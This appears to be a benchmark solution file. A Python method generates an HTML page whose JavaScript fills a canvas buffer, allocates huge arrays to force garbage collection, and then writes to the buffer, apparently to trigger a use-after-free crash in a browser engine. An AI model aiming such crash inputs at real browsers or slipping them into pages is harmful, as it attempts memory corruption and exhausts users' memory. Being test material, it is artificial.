class Solution:
    def solve(self, src_path: str) -> bytes:
        js = """
var canvas = document.createElement('canvas');
canvas.width = 1024;
canvas.height = 1024;
var ctx = canvas.getContext('2d');
var imgData = ctx.createImageData(canvas.width, canvas.height);
var data = imgData.data;

for (var i = 0; i < data.length; i++) {
    data[i] = i % 256;
}

ctx.putImageData(imgData, 0, 0);

function allocGarbage(n, size) {
    var g = [];
    for (var i = 0; i < n; i++) {
        g.push(new Array(size).fill(Math.random()));
    }
    return g;
}

var g1 = allocGarbage(20000, 1000);
var g2 = allocGarbage(20000, 1000);
var g3 = allocGarbage(20000, 1000);
var g4 = allocGarbage(20000, 1000);

// Access after potential GC
data[0] = 255;
data[1] = 0;
data[2] = 0;
data[3] = 255;

console.log('Access after garbage allocation:', data[0]);
"""
        html = f'<html><head></head><body><script>{js}</script></body></html>'
        return html.encode('utf-8')
